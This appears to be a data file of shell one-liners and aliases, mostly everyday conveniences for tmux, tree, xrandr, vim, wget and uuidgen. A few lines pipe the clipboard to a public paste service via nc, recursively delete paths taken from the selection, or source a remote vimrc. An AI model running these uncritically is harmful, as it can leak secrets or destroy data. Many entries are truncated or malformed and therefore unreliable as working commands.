yay -Qq | fzf -m --preview 'yay -Si {1}' | xargs -ro sudo pacman -Rns
yarn start || yarn run watch
yarn check || yarn install
yarn add --dev $(cat package.json| jq '.devDependencies | keys[]' -r)
yaourt -Sy $(yaourt -Ss $@|head -1|cut -f2 -d
yaourt -Sl | cut -d' ' -f2 | grep
yaourt -S \$(cower --update | awk '{print \$2}' | tr '\n' ' ')
xz --threads=$(cat /proc/cpuinfo|grep cores|wc -l)
xxd -ps -c $(expr $(tput cols) / 2) /dev/zero | sed s/0/█/g | lolcat
xxd -p | tr -d '\n' | sed 's/\(..\)/%\1/g'
xwininfo |grep '^xwininfo: Window id:' | awk '{print $4}'
xsel | text2wave | mpv -af scaletempo --speed=1.7 -
xsel | text2wave | mpv --af=scaletempo --speed=1.7 -
xsel -ob|qrencode -t PNG -o - -s 80|feh -Z - -.
xsel -o | cut -d : -f 1 | xargs rm -r
xsel -b | sed 's/ //g' | xsel -b
xsel -b | base64 -d | gzip -d
xscreensaver -no-splash || xscreensaver-command -lock
xs_get_fzf_inline | vipe | xs_set_fzf_inline
xrandr | sed -n 's/ connected.*//p' | xargs -n1 -tri xrandr --output {} --brightness 1 --gamma 1:1:1
xrandr | grep -v disconnected | awk '/connected/ { print \$1 }'
xrandr -q | perl -lnE 'our %mon; /^(\S+)\s+connected\s+(?:primary\s+)?/; \$mon{\$1}=1 if \$1;}{my @output = grep {!/eDP/} keys %mon; my \$output = shift @output; my @main = grep {/eDP/} keys %mon; my \$main = shift @main; say qq{xrandr --output \$output --auto --rotate normal --same-as \$main --output \$main --auto}' | bash
xrandr -q | perl -lnE 'our %mon; /^(\S+)\s+connected\s+(?:primary\s+)?/; \$mon{\$1}=1 if \$1;}{my @output = grep {!/eDP/} keys %mon; my \$output = shift @output; my @main = grep {/eDP/} keys %mon; my \$main = shift @main; say qq{xrandr --output \$output --auto --above \$main --rotate left --output \$main --auto}' | bash
xrandr -q | awk '/connected primary/ {print \$1}' | xargs -I {} xrandr --output {} --brightness 1.3
xrandr -q | awk '/connected primary/ {print \$1}' | xargs -I {} xrandr --output {} --brightness 1.1
xrandr -q | awk '/connected primary/ {print \$1}' | xargs -I {} xrandr --output {} --brightness 1
xrandr -q | awk '/connected primary/ {print \$1}' | xargs -I {} xrandr --output {} --brightness 0.8
xrandr -q | awk '/connected primary/ {print \$1}' | xargs -I {} xrandr --output {} --brightness 0.6
xrandr --output $(xrandr -q | grep ' connected' | awk '{print $1}') --brightness
xrandr --auto --output VGA1 --mode 1440x900 --left-of eDP1 || xrandr --auto
xprop | grep WM_PID | tr -dc '[:digit:]'
xprop | grep WM_NAME\(UTF8_STRING\) | grep -oP '\
xprop | grep WM_NAME\(STRING\) | grep -oP '\
xprop | grep WM_CLASS | awk '{print $4}'
xprop | grep WM_CLASS | awk '{ print $4 }'
xprop | grep -v ^$'\t[^\w\t]' | tr -s '\n'
xprop _NET_WM_PID | cut -d= -f2 | trim
xmllint --format - | pygmentize -lxml | less
xinput | grep TouchPad | sed -r 's/.*id=([0-9]*).*/\1/g'
xinput | grep -i 'optical mouse ' && xinput | grep -i 'Synaptics TouchPad' && xinput set-prop 'SynPS/2 Synaptics TouchPad' 'Device Enabled' 0
xinput list | grep Syn | grep -o -P
xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test
xinput list | grep -Po 'M325\s+id=\d+.+pointer' | grep -Po '(?<==)\d+'
xinput list | grep -Po '2013\s+id=\d+.+pointer' | grep -Po '(?<==)\d+'
xfreerdp -g 768x1024 --ignore-certificate -d win.ntnu.no -u vegahag --app --plugin rail --data '||WINWORD' -- officefarm.ntnu.no
xfreerdp -g 768x1024 --ignore-certificate -d win.ntnu.no -u vegahag --app --plugin rail --data '||OUTLOOK' -- officefarm.ntnu.no
xfconf-query -c xfce4-keyboard-shortcuts -l -v | cut -d'/' -f4 | awk '{printf
xev | grep 'keycode\|button'
xdotool windowsize $(xdotool getactivewindow) $(xdpyinfo | awk '/dimensions/{print $2}' | awk -F'x' '{ print $1-90
xdg-open || :
xcrun simctl list | grep Booted | grep -oE '(\w+-\w+)+'
xcrun simctl list | grep -oh '[A-Z0-9]\{8\}-[A-Z0-9]\{4\}-[A-Z0-9]\{4\}-[A-Z0-9]\{4\}-[A-Z0-9]\{12\}' | xargs -I{} xcrun simctl erase {};
xcrun simctl boot \`xcrun simctl list devices | peco | sed -E 's/^.* \(([A-Z0-9\-]*)\) .*$/\1/1'\`
xcodebuild -workspace ~/Developer/dynepic/ios/ios-apps/Core.xcworkspace -scheme iOKidsNew clean build | grep [1-9].[0-9]ms | sort -nr > culprits.txt
xcode-select -p | sed 's/\/Contents\/Developer//' | xargs open
xclip ; xclip -o | xclip -selection clipboard; xclip -o | while read msg; do notify-send Clipboard $msg ; done
xclip -selection c -o | sort | xclip -selection c -i
xclip -o | vipe | xclip -r
xclip -o | vipe | ifne fb
xclip -o | python ~/feng-shui/scripts/quote.py | xclip ; xclip -o
xclip -o | nc termbin.com 9999 | xsel -b
xclip -o | gpg --decrypt | xclip
xclip -o | fold -w 80 -s | xclip -selection clipboard
xclip -o -selection primary | vipe | xclip -i -selection primary
xclip -o -selection clipboard | tr -d '\n' | xclip -selection clipboard
xclip -i -sel p -f | xclip -f -i -sel c | xclip -i -sel s
xclip -filter -selection primary | xclip -filter -selection secondary | xclip -filter -selection clipboard
xcfile() { local workspace=\$(find *.xcworkspace 2>/dev/null | head -1); local project=\$(find *.xcodeproj 2>/dev/null | head -1); \${workspace:-\${project}} ; }; open -a Xcode \
xcape -e 'Control_L=Shift_L|parenleft;Control_R=Shift_R|parenright' &
xattr -d com.apple.quarantine err.txt generated.file succ.txt 2>/dev/null || true
xargs | tr ' ' '+' | bc -l
xargs | tr ' ' '+' | bc
xargs stat -f '%z' | paste -sd+ - | bc
xargs echo -n | xclip -selection primary -f | xclip -selection clipboard
xargs -0 | qrencode -o - | display
x;history 44 | sed 's/\[[0-9].*[0-9]\] //' | pr -w`tput cols` -2 -l22 -t
w|sort|more
workon . || mkvirtualenv -p $(which python3.7) ${PWD##*/}
workon . || mkvirtualenv -p $(which python2.7) ${PWD##*/}
workon $(pwd | rev | cut -d
wmctrl -ia `wmctrl -lx | grep spotify.Spotify | awk '{ print $0 }'`
who|sort|more
who | sort | uniq -cw 10
who | sort | more
who | sort | less
who | cut -c1-9 | sort -u
who am i | sed s/.*\(// | sed s/\)//
while true; do tk || break; done
while true; do sl -e || break; done
while true; do ping www.google.com && break; sleep 1 || break; done
while true; do ping -c1 ya.ru && break || sleep 1; done
while true; do nvidia-smi | grep -o '1\?[0-9][0-9]%' | tr -d '\n'; sleep 1; echo -ne '\033[2K\r'; done
while true; do head -c200 /dev/urandom | od -An -w50 -x | grep -E --color \
while true; do git pull --rebase || break; git push && break; done
while true; do date | rpipe 2; sleep 5; curl -s https://news.ycombinator.com | grep 'class=\
while true; do clear; ipl | grep 003; echo;echo; ifl | grep 00200; sleep 5; done
while true; do [ ! -d .git ] && cd .. || break; done
while pgrep -l mplayer || pgrep -l mpv; do sleep 2s; done
which reattach-to-user-namespace > /dev/null && reattach-to-user-namespace -l $SHELL || $SHELL
which nvim &>/dev/null && nvim || vim
which htop > /dev/null && htop || top
which exa > /dev/null && exa -laF --group-directories-first || command ls -la
which exa > /dev/null && exa -1F --group-directories-first || command ls -1
whatis \$(compgen -c) 2>/dev/null | sort | less
whatis $(ls /bin | shuf -n 1) | cowsay
wget wttr.in 2>/dev/null -O - | grep -v 'New feature*\|Follow'
wget randomfunfacts.com -O - 2>/dev/null | grep \<strong\> | sed 's;^.*<i>\(.*\)</i>.*$;\1;'
wget http://checkip.dyndns.org/ -O - -o /dev/null | cut -d: -f 2 | cut -d\< -f 1
wget http://checkip.dyndns.org -O - -o /dev/null | cut -d: -f 2 | cut -d\< -f 1
wget -qO- http://ipecho.net/plain | tee /dev/tty | xclip; echo
wget -qO - isitmfbt.com | grep 'theTime' | sed -e 's/<[^>]*>//g'
wget -qO - http://wttr.in/ | head -17 | tail -n +8
wget -qO - http://infiltrated.net/blacklisted | awk '!/#|[a-z]/&&/./{print \
wget -q http://info.ddo.jp/remote_addr.php -O - | grep REMOTE_ADDR | cut -c 13-
wget -q http://checkip.dyndns.org -O- | cut -d: -f2 | cut -d\< -f1
wget -q -O- http://lipsum.com/feed/html | tidy -q -numeric -asxhtml --show-warnings no - | xmlstarlet sel -N xhtml='http://www.w3.org/1999/xhtml' -t --copy-of \
wget -q -O - http://www.radioparadise.com/musiclinks/rp_192.m3u|tr -d '\r' |xargs cmus-remote
wget -q -O - http://ipfoo.de | awk 'NR==58' | sed 's/»··//g'
wget -q -O - checkip.dyndns.org | sed -e 's/[^[:digit:]|.]//g'
wget -q -O - 'http://mojeip.cz' | grep -oE '([0-9]+\.){3}[0-9]+' | head -1
wget -q -O - 'http://httpbin.org/ip' | cat - | jq -r '.origin'
wget -O - http://www.weather.com.cn/weather/101020100.shtml | html2text | less
wget --quiet speedtest.edpnet.be/speedtest4.php -O - | grep -o 'Your BandWidth [0-9][^)]*)' | cat
wellknown | reproj --from=EPSG:3006 --to=EPSG:4326 | geojsonio
webx 'http://news.sina.cn/?pos=1&vt=1&ttp=f1|1|1'
wc -w err.txt generated.file succ.txt | sort | tail -n10' # sort files in current directory by the number of words they contain
wc -w err.txt generated.file succ.txt | sort | tail -n10' # Sort files in current directory by the number of words they contain
wc -w err.txt generated.file succ.txt | sort | tail -n10'
wc -w err.txt generated.file succ.txt | sort | tail -n10
watch tail -n 20 $(ls -rt | grep .out | tail -n 1)
watch tail -n 20 $(ls -rt | grep .err | tail -n 1)
watch -n5 golint $(go list ./... | grep -v vendor | grep -v proto)
watch -n1 'conv.sh 5 | tail -n15 | head -n9; for i in {5..9}; do echo -e \
watch -n 5 elb-check $(elb-check -l | grep stg | grep web)
watch -n 5 elb-check $(elb-check -l | grep prd | grep web)
watch -n 1 'ps awwwuxf | grep eric | grep -v awwwuxf'
watch 'docker ps; echo; echo Container count: ; docker ps | egrep -v COMMAND | wc -l; echo; docker network ls'
w_color | e_color | f_color
w3m -dump http://devexcuses.com/ | head -1 | say -v daniel
w | sort | more
w | head -n1 | cut -d: -f4
w | grep -v grep | grep
w | egrep --color=always '^|`whoami`.*$'
w -fh | grep --color=never -wf ~/buddylist.txt| sort
vu -kill || Vu -kill
vsus $(vst | grep running | awk '{print $1}')
vscodium || codium
vs -c 'cat /etc/motd | grep -F Host: | egrep -o [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
vmstat 1 2 | tail -1 | awk '{printf \
virsh list | grep running | nl
vim' $BASHRC_CONF_FILE || echo -e '\nalias vi=vim' >> $BASHRC_CONF_FILE
vim || alias vim=vi \n
vim || alias vim=vi
vim ||
vim src/**/*.(java|proto|groovy) gen/**/*.java examples/**/*.java
vim db/migrate/$(ls db/migrate | sort | tail -1)
vim `readlink ~/.vimrc || echo ~/.vimrc`
vim `readlink ~/.vim/vimrc_plugins || echo ~/.vim/vimrc_plugins`
vim `readlink ~/.config/nvim/vimrc_plugins || echo ~/.config/nvim/vimrc_plugins`
vim `readlink ~/.config/nvim/init.vim || echo ~/.config/nvim/init.vim`
vim `ls -t *.@(pl|cgi)| head -1 `
vim `grep -rE 'state:\s*working' ~/Dropbox/projects/short-stories/30Days/*.text | awk -F: '{print \$1}' | xargs`
vim `git diff --name-only | uniq | xargs`
vim `file $(git diff --name-only HEAD~8) | grep -i ASCII | cut -d: -f1`
vim `file $(git diff --name-only HEAD~7) | grep -i ASCII | cut -d: -f1`
vim `file $(git diff --name-only HEAD~6) | grep -i ASCII | cut -d: -f1`
vim `file $(git diff --name-only HEAD~5) | grep -i ASCII | cut -d: -f1`
vim `file $(git diff --name-only HEAD~4) | grep -i ASCII | cut -d: -f1`
vim `file $(git diff --name-only HEAD~3) | grep -i ASCII | cut -d: -f1`
vim `file $(git diff --name-only HEAD~2) | grep -i ASCII | cut -d: -f1`
vim `file $(git diff --name-only HEAD~1) | grep -i ASCII | cut -d: -f1`
vim \`gst -s | grep '^ M ' | cut -d ' ' -f 3\`
vim \$(git status --porcelain=v2 | grep -P '\.M' | cut -d ' ' -f 9)
vim -u NONE --cmd 'set nocp | sy on | filetype plugin indent on'
vim -p `echo $HOME/.bash* | xargs -n 1 | grep -ve
vim -p \$(git status -s | grep '^UU ' | awk '{print \$2}')
vim -p (*.h|*.cc|*.cpp)
vim -o \`git status -s --porcelain -uall | cut -c4- | sed \
vim -c 'set et | retab | wc'
vim -c 'Gstatus | wincmd j | hide' f
vim -c ':source scp://$USER@$(nslookup mach_name | head -1 | awk '{ print $2 }')//$HOME/.vimrc'
vim --remote-silent || vim
vim $(gst | ack unmerged | cut -d : -f 2)
vim $(git status --porcelain | grep UU | awk
vim $(flake8 | cut -d: -f 1 | uniq)
vim $(ag -l TODO | gshuf | head -n 1)
vim $( ls /tmp/vim-anywhere | sort -r | head -n 1 )
view-markdown() { cat $1 | pandoc -f markdown -t html | lynx -stdin };view-markdown
vi ~/notes/today/$(ls ~/notes/today | sort | tail -n 1)
vi ||
vi $HOME/.bash_profile && SKIP_SOURCE_PROFILE=1 source $HOME/.bash_profile || SKIP_SOURCE_PROFILE=1 source $HOME/.bash_profile
vi $(git ls-files | fzf | head -n 1)
vboxmanage list runningvms | sed -r 's/.*\{(.*)\}/\1/' | xargs -L1 -I {} VBoxManage controlvm {} savestate && sudo shutdown -r now
vboxmanage list runningvms | sed -r 's/.*\{(.*)\}/\1/' | xargs -L1 -I {} VBoxManage controlvm {} savestate && sudo shutdown -h now
vboxmanage list runningvms | sed -r 's/.*\{(.*)\}/\1/' | xargs -L1 -I {} VBoxManage controlvm {} savestate
vboxmanage list runningvms | sed 's/.*{\(.*\)}/\1/g' | xargs -LI -I {} VBoxManage controlvm {} poweroff
vboxmanage list runningvms | gsed -r 's/.*\{(.*)\}/\1/' | xargs -L1 -I {} VBoxManage controlvm {} acpipowerbutton
vboxheadless --version | tail -n 1 | sed -r 's/(.+)r.+/\1/'
vault-renew | grep -Po 'token: (.*)' | cut -d ' ' -f 2
vault write -f sys/replication/performance/primary/enable; vault2 write -f -field=secondary_public_key sys/replication/performance/secondary/generate-public-key | vault write -field token sys/replication/performance/primary/secondary-token id=asdf secondary_public_key=- | vault2 write sys/replication/performance/secondary/enable token=-
vault write -f sys/replication/dr/primary/enable; vault2 write -f -field=secondary_public_key sys/replication/dr/secondary/generate-public-key | vault write -field token sys/replication/dr/primary/secondary-token id=asdf secondary_public_key=- | vault2 write sys/replication/dr/secondary/enable token=-
var=\$( (ls -d */ ; ls -d .*/) 2>/dev/null | cut -f1 -d'/' | rofi -dmenu -i -p \
validate_sudo || init_sudo; sudo
valet stop || lststop
vagrant up || vagrant up
vagrant ssh || vagrant up && vagrant ssh
vagrant global-status | awk '/running/{print $1}' | xargs -r -d '\n' -n 1 -- vagrant suspend
vagrant global-status | awk '/running/{print $1}' | xargs -r -d '\n' -n 1 -- vagrant halt
vagrant global-status | awk '/running/{print $1}' | gxargs -r -d '\n' -n 1 -- vagrant suspend
vagrant box list | cut -f 1 -d ' ' | xargs -L 1 vagrant box remove -f
va global-status | grep running | awk '{print $5}'
uuidgen|tr -d '\n'|pbcopy&&pbpaste&&printf '\n'
uuidgen| tr '[:upper:]' '[:lower:]' | pbcopy
uuidgen | tr -d - | tr -d '\n'
uuidgen | tr -d - | tr '[:upper:]' '[:lower:]'
uuidgen | tr -d '\n' | tr '[:upper:]' '[:lower:]'
uuidgen | tr -d '\n' | pbcopy; pbpaste
uuidgen | tr -d '-' | tr 'a-z' 'A-Z'
uuidgen | tr '[:upper:]' '[:lower:]' | tr -d \
uuidgen | tr '[:upper:]' '[:lower:]' | tr -d '\n'
uuidgen | tr '[:upper:]' '[:lower:]' | sed 's/-//g'
uuidgen | tr '[:upper:]' '[:lower:]' | pbcopy && pbpaste && echo
uuidgen | tr '[:upper:]' '[:lower:]' | lolcat
uuidgen | head -n1 | lowerCase
uuidgen | awk '{printf tolower(\$0)}' | pbcopy
uuid_generator | tr '\n' ' ' | pbcopy
uuid=$(uuidgen | tr [:upper:] [:lower:]) && echo $uuid && printf $uuid | pbcopy
util | grep % | awk
usr/ucb/ps -aguxww| grep $USER |grep
users | grep -o '\w\+' | uniq
urxvtc || urxvt
urxvt; } ||
urxvt || pwd &
urxvt -pixmap '`find ~/pix/wall/ -name '*.jpg' | sort -R | head -n 1`;style=tiled' -T myKitten &
uptime -p | cowsay | lolcat
upower -i `upower -e|grep battery`|grep capacity
upower -i `upower -e | grep bat` | grep %
upower -i `upower -e | grep BAT0` | grep --color=none percentage
upower -i /org/freedesktop/UPower/devices/battery_BAT1 | grep percentage | awk '{print \$2}'
upower -i /org/freedesktop/UPower/devices/battery_BAT1 | grep percent | awk -F ' ' '{print }'
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | egrep 'percentage|state'
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | ag --nocolor (state|percentage)
upower -i $(upower -e | grep BAT0) | grep \
upower -i $(upower -e | grep BAT) | grep --color=never -E \
upower -i $(upower -e | grep 'BAT') | grep -E \
upower -i $(upower -e | grep 'BAT') | grep -E 'percentage'
upower -i $(upower -e | grep '/battery') | grep --color=never -E \
upower -e | grep 'BAT' | xargs upower -i
upower -e | fgrep -F BAT | xargs -n 1 upower -i
upower -d | grep time | head -n 1
upower -d | grep -m 1 percentage | grep -Po '[0-9][0-9]*%'
unzip -q -c ${1}/${1}.jar META-INF/MANIFEST.MF|grep Build-Version|awk '{print $2}'
unset `printenv | grep ^DOCKER | cut -f1 -d=`
unset `env | grep DOCKER | cut -d
unrvi>/dev/null;udid|awk '/Serial Number/{print \$3}'|xargs rvictl -s
unicode-sample.sh -list | column -t | column
unhide (proc|sys|brute)
unbuffer nice make -j18 2>&1 | tee /tmp/last_build.tmp | more && sed -i 's/\x1b\[[0-9;]*m//g;s/\x1b\[K//g' /tmp/last_build.tmp
unbuffer mpv 'http://sc-tcl.1.fm:8010/' |grep --line-buffered icy-title | sed -u 's/.*icy-title: /p/' > /tmp/panel-fifo
unbuffer mpv 'http://relay.181.fm:8070' |grep --line-buffered icy-title | sed -u 's/.*icy-title: /p/' > /tmp/panel-fifo
unbuffer mpv 'http://relay.181.fm:8028' |grep --line-buffered icy-title | sed -u 's/.*icy-title: /p/' > /tmp/panel-fifo
unbuffer git for-each-ref --format='%(authorname)%09%(color:green)%(refname:short)%(color:reset)%09%(objectname:short) [%(color:blue)%(if)%(upstream)%(then)%(upstream:lstrip=2)%(else)untracked%(end)%(color:reset)]%09%(subject)' --sort=authorname | column -t -s $'\t' | cut -c -\$(tput cols)
udid|awk '/Serial Number/{print \$3}'|xargs rvictl -x
type tree >/dev/null && tree -da -L 1 || l -d ../ ./ */
type tree >/dev/null && tree --dirsfirst -a -L 1 || l -d ../ ./ */
type ksh >/dev/null && strings $(which ksh) | grep Version | tail -2
type colordiff > /dev/null && colordiff -u || diff
tw +S info | tail -2 | head -1
ts|strip|pbcp
tsd || true && /usr/local/opt/tomcat/libexec/bin/catalina.sh jpda start
tsc | grep -oP '^[A-z].*\(' | sed 's/.$//'
ts $(whoami) || ta $(whoami)
true); exceptions_exit_try $? ||
tree | grep -v pyc | grep -v __init__
tree -adC --dirsfirst -I '.git|node_modules|bower_components'
tree -aC -I '.git|node_modules|vendor' --dirsfirst
tree -aC -I '.git|node_modules|bower_components' --dirsfirst
tree -aC -I '.Trash|.git|node_modules' --dirsfirst
tree -aC --dirsfirst -I '.git|node_modules|bower_components'
tree -a -I 'node_modules|.git|.DS_Store' --dirsfirst
tree -a -I '.idea|target|.git'
tree -a -I '.git|__pycache__|*.pyc'
tree -a -F -I '.git|node_modules|bower_components' --dirsfirst
tree -a -C -I node_modules\|.git\|bower_components
tree -a -C -I '.git|.DS_Store' | less
tree -a --noreport --dirsfirst -I '.git|node_modules|.DS_Store'
tree -L 2 -if ~/dev/projects | grep stack.yaml | xargs grep -E \
tree -I 'virt_*|__pycache__|*.pyc'
tree -I 'tmp|node_modules|bower_components'
tree -I 'target|node_modules|vendor'
tree -I 'target|lib_managed|tmp'
tree -I 'node_modules|vendor|yarn-packages'
tree -I 'node_modules|tmp|vendor'
tree -I 'node_modules|tmp|bower_components'
tree -I 'node_modules|static_dist|staticfiles'
tree -I 'node_modules|fonts|spotify-icons-logos'
tree -I 'node_modules|cache|test_*' --ignore-case
tree -I 'node_modules|cache|.git'
tree -I 'node_modules|bower_components|Gemfile*' -F --dirsfirst
tree -I 'node_modules|bower_components|.git'
tree -I 'doc|deps|_build'
tree -I '__pycache__|venv|node_modules'
tree -I '.git|node_modules|dist'
tree -I '.git|node_modules|bower_components'
tree -I '.git|node_modules|.sass-cache' --dirsfirst -aC
tree -I '.git|bower_components|node_modules' --dirsfirst
tree -I '.git|.svn|*.swp'
tree -FaI 'node_modules|.git|.DS_Store'
tree -C -a --dirsfirst -I '.git|node_modules|.DS_Store'
tree -C -I 'node_modules|*.pyc|venv' --dirsfirst
tree -C --dirsfirst -I '.git|.svn|.pki'
tree -A -f -d -I 'bower_components|node_modules|tmp' --noreport
tree --noreport -f -C -tr | fzfr --ansi | afs -F'── ' -m 2
tree --dirsfirst -I '__pycache__|venv|node_modules'
trash-list | sort | tail -n
tr A-Z a-z | tr -cd cbdefghijklnrtuv | tr cbdefghijklnrtuv 0-9a-f
tr A-Z a-z | tr -cd 0-9a-f | tr 0-9a-f cbdefghijklnrtuv
tr -dc a-zA-Z0-9 < /dev/urandom | head -c 8 | xargs
tr -dc a-z0-9A-Z:_! < /dev/urandom | fold -w16 | head -1
tr -dc [:alnum:] < /dev/urandom | fold -w30 | head -n25
tr -dc A-Za-z0-9_ < /dev/urandom | head -c 27 | xargs
tr -dc A-Za-z0-9_ < /dev/urandom | head -c 20 | pbcopy
tr -dc A-Za-z0-9 < /dev/urandom | head -c 16 | xargs
tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | fold -w 12 | head -n 1
tr -dc '(-~' < /dev/urandom | head -c${1:-37} | pbcopy
tr -d '\\n' | xmllint --format - |pygmentize -l xml
tr -cd '[:graph:]' < /dev/urandom | fold -w ${1:-16} | head
tr -cd '[:alnum:]' < /dev/urandom | fold -w32 | head -n1
tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1
tr -c '[[:alnum:]] ' '_' | tr ' ' '_' | tr -s '\n'
tr ':' ' ' | awk '{ print ${dollar}1 }' | no-repeats.py
tr '.' '\n' | head -n2 | awk '{ a=0; while (a++<length(\$0) % 4) s=s \
tput rmam; ps | grep -v $@ | grep -i -e VSZ -e; tput smam
tput reset || clear
toybox du -xhd 2 2>/dev/null | sort -nr | head -n
touch $(git status -s|grep -v pom.xml|cut -c4-)
top_log | awk \'{print $2}\' | xargs git show
top -n 1 | head -n 5 | tail -n 2
top -l 1 | head -n 10 | grep PhysMem
top -l 1 | head -10 | sed -n /PhysMem/p
top -l 1 | head -10 | sed -n /CPU/p
top -l 1 | grep $1 | awk \{print \$10\}
top -l 1 | awk '/PhysMem/' | cut -d ':' -f 2
top -l 1 | awk '/(pagein|Mem)/'; vm_stat
top -l 1 -o rsize | head -20 | less
top -b 1 | head -n 8 && top -b all | egrep
top -b -n1 | tail -n +8 | sort -n -r -k 9
top -b -n1 | tail -n +8 | sort -n -r -k 10
top -b -n 1 | grep pw.x |wc -l
tn | toilet | lolcat
tmx2 || tmux
tmx2 attach-session -t tmux_base || tmx2 new-session -s tmux_base
tmuxx attach || tmuxx new-session \; source-file ~/dotfiles/.tmux.session
tmuxp load work || tmux
tmuxp load -y2 . || tmux attach
tmuxn || tmuxa
tmux || alias s=screen
tmux show-buffer | xclip -sel clip -i | echo 'Copied tmux buffer to system clipboard'
tmux show-buffer | tr -d '\n' | pbcopy
tmux new-session -t default || tmux new-session -s default
tmux new-session -t 0 || tmux
tmux new-session -d -s meatmux; tmux new-session -t meatmux \; set-option destroy-unattached || tmux new-session -t meatmux
tmux new -s work || tmux a -t work
tmux new -s vpn||tmux a -t vpn
tmux new -s tmuxconf \; source-file ~/.tmux/tmuxconf || tmux attach -t tmuxconf
tmux new -s ssh-monitor \; source-file ~/.tmux/ssh-monitor || tmux attach -t ssh-monitor
tmux new -s sc \; source-file ~/.tmux/scheme || tmux attach -t sc
tmux new -s rust \; source-file ~/.tmux/rust || tmux attach -t rust
tmux new -s pen \; source-file ~/.tmux/pen || tmux attach -t pen
tmux new -s ml \; source-file ~/.tmux/ocaml || tmux attach -t ml
tmux new -s kr \; source-file ~/.tmux/kr || tmux attach -t kr
tmux new -s js \; source-file ~/.tmux/javascript || tmux attach -t js
tmux new -s jie || tmux a -t jie -d
tmux new -s hs \; source-file ~/.tmux/haskell || tmux attach -t hs
tmux new -s flywire||tmux a -t flywire
tmux new -s ethereum \; source-file ~/.tmux/ethereum || tmux attach -t ethereum
tmux new -s dump \; source-file ~/.tmux/dump || tmux attach -t dump
tmux new -s coq \; source-file ~/.tmux/coq || tmux attach -t coq
tmux new -s cada || tmux at -t cada
tmux new -s c \; source-file ~/.tmux/c || tmux attach -t c
tmux new -s blog \; source-file ~/.tmux/blog || tmux attach -t blog
tmux new -s ag \; source-file ~/.tmux/agda || tmux attach -t ag
tmux new -s DROP || tmux attach -t DROP
tmux new -s $TMUX_SESSION 2> /dev/null || tmux attach -t $TMUX_SESSION
tmux new -s $(basename $(pwd)) || tmux attach-session -t $(basename $(pwd))
tmux ls | grep attach | cat -n
tmux ls | grep -v attach | cat -n
tmux ls | cut -d: -f1 | xargs -L1 tmux kill-session -t
tmux ls | cut -d : -f 1 | xargs -I {} tmux kill-session -t {}
tmux ls | cut -d ':' -f 1 | xargs -I% tmux kill-session -t %
tmux ls | cut -d ' ' -f 1 | sed 's/://'
tmux ls 2>/dev/null || echo 'No sessions available'
tmux ls 2>/dev/null && tmux attach-session || tmux
tmux ls -F #{window_name} | fzf | xargs tmux select-window -t
tmux ls -F #{session_name} | fzf | xargs tmux attach -t
tmux ls && tmux a || tmux
tmux ls && read tmux_session && tmux attach -t ${tmux_session:-default} && exit || tmux new -s ${tmux_session:-default} && exit
tmux list-windows | fzf | cut -d
tmux list-windows | cut -d: -f1 | xargs -I\{\} tmux send-keys -t {}
tmux list-windows -F '#{window_active} #{window_layout}' | grep '^1' | cut -d ' ' -f 2
tmux list-sessions || tmux;tmux a -t0
tmux list-sessions | sed -E 's/:.*$//' | grep -v \
tmux list-sessions | grep -o ^. | xargs -n 1 tmux kill-session -t
tmux list-sessions | grep -E -v '\(attached\)$' | while IFS='\n' read line; do tmux kill-session -t \
tmux list-sessions | fzf | cut -d
tmux list-sessions | cut -d: -f1 | xargs -I{} tmux kill-session -t {} && tmux
tmux list-sessions 2>/dev/null || error wha\'s like tmux? damn few and they\'re a\'deid
tmux list-sessions 2>/dev/null 1>&2 && tmux a || tmux
tmux list-sessions 2> /dev/null && tmux attach || tmux'
tmux kill-session 2> /dev/null || exit
tmux kill-session -t $(tmux list-sessions|fzf|cut -f1 -d:)
tmux kill-session -a; tmux list-sessions | cut -d ':' -f1 | xargs tmux kill-session -t
tmux has-session -t other > /dev/null 2>&1 && tmux a -t other || tmux new -s other
tmux has-session -t default > /dev/null 2>&1 && tmux a -t default || tmux new -s default
tmux has-session -t TearDrop && tmux attach -t TearDrop || tmux new -s TearDrop
tmux has-session -t $USER || tmux new-session -s $USER && tmux -2 attach-session -t $USER
tmux has-session -t $USER && exec tmux attach -t $USER || exec tmux new -s $USER
tmux has-session && tmux attach || tmux new-session
tmux has-session && tmux attach || tmux ; exit
tmux has-session && tmux attach || tmux
tmux has -t $1 &> /dev/null && tmux attach -t $1 || tmux new -s $1
tmux has && tmux -2 attach || tmux -2 new
tmux detach >/dev/null 2>&1; tmux attach || tmux
tmux detach -P ; tmux a -d || tmux new
tmux capture-pane; tmux showb -b 0 | tail -n 3 | head -n 1
tmux a||tmux new-s
tmux attach-session || tmux new-session -s main_session
tmux attach-session || tmux new-session -A
tmux attach-session || tmux new-session
tmux attach-session || tmux new
tmux attach-session || tmux
tmux attach-session -t0 || tmux
tmux attach-session -t work || tmux new-session -s work
tmux attach-session -t ssh || tmux new-session -s ssh
tmux attach-session -t sandbox || tmux new-session -s sandbox
tmux attach-session -t rtorrent || tmux new-session -s rtorrent
tmux attach-session -t rtord || tmux new-session -s rtord
tmux attach-session -t rt || tmux new-session -s rt rtorrent
tmux attach-session -t root || tmux new-session -s root
tmux attach-session -t pro || tmux new-session -s pro
tmux attach-session -t my || tmux new-session -s my
tmux attach-session -t main || tmux new-session -s main
tmux attach-session -t local || tmux new-session -s local
tmux attach-session -t irc || tmux new-session -s irc
tmux attach-session -t irc || tmux new -d -n weechat -s irc weechat-curses
tmux attach-session -t hb || tmux new-session -s hb
tmux attach-session -t dev || tmux new-session -s dev -n ide
tmux attach-session -t default || tmux new-session -s default
tmux attach-session -t d || tmux new -s d
tmux attach-session -t cmus 2>/dev/null || tmux -f '$XDG_CONFIG_HOME/cmus/tmux.conf' new-session -s cmus 'cmus'
tmux attach-session -t c || tmux new -s c
tmux attach-session -t b || tmux new -s b
tmux attach-session -t a || tmux new -s a
tmux attach-session -t DevScreen || tmux new-session -s DevScreen
tmux attach-session -t '~' || tmux new-session -c $HOME -s '\~'
tmux attach-session -t $(tmux list-sessions | fzf | sed
tmux attach-session -t $(pwd | rev | cut -d
tmux attach-session -d || tmux new
tmux attach-session -d || tmux
tmux attach-session -d -t main || tmux new-session -s main irssi
tmux attach-session -d -t main || tmux new -s main
tmux attach-session -d -t lab || tmux new-session -s lab
tmux attach || { (while ! tmux run-shell ~/.tmux/plugins/tmux-resurrect/scripts/restore.sh; do sleep 0.2; done)& tmux;}
